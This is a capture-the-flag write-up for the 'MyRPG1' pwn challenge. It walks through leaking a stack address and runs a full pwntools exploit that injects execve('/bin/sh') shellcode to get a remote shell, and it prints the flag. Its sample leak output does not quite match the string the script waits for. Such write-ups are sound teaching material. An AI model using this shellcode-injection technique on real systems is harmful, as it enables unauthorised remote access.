# MyRPG1

## Category  
Pwn

## Description  
I'm developing a small RPG — maybe you can verify if it is secure?

You're given a binary named `myrpg`, and access to a remote service:

```
nc myrpg1.challenges.cybersecuritychallenge.be 1337
```

## Files Provided  
- `myrpg` (64-bit ELF binary)

## Write-up  

After launching the binary, I found a basic menu interface. One of the menu options leaks a stack address:

```
> 2
Please wait...
Here is an address: 0x7ffe91e3c5f0
```

This address is critical — I can use it to jump to injected shellcode.

### Exploitation Strategy

1. Use option `2` to leak a stack address.
2. Craft a shellcode for `execve("/bin/sh")`, aligned with some NOP padding and the leaked return address.
3. Inject the payload using option `1`, which allows arbitrary input.
4. Trigger execution via option `4`.

### Exploit Script

```python
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == b'\n' else l, 16)
_base_ = lambda a: a[0].split(':') if ':' in a[0] else a
parse = lambda a: _base_(a[2:] if (a and a[1] == 'nc') else a[1:])

def attach(_input: bool = False):
    if args.GDB:
        gdb.attach(io, "b *new_game+461")
        if _input: input("Continue?")

exe = "./myrpg"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(*parse(sys.argv)) if args.REMOTE else process(argv=[exe], aslr=True)

attach()

def menu(idx):
    io.sendlineafter(b"> ", encode(idx))

# Start game to enable interaction
menu(1)

# Leak stack address
log.info("Waiting for leak....")
menu(2)
io.recvuntil(b"address : ")
stack = hexleak(io.recvline().strip())
log.info(f"stack @ {hex(stack)}")

# Send payload
menu(1)
shellcode = asm("""
    /* execve("/bin/sh", 0, 0) */
    lea rdi, sh[rip]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    /* exit(0) */
    xor rdi, rdi
    mov rax, 0x3c
    syscall
sh: .string "/bin/sh"
""").ljust(56, b"\x90")
payload = shellcode + p64(stack)

log.info("Writing payload...")
menu(payload)

# Trigger shell
log.info("Waiting for return...")
menu(4)

io.interactive()
```

## Result

This grants a shell on the remote server when connected via `nc`.

## Flag  
```
CSC{cr1t1c4l_succ355}
```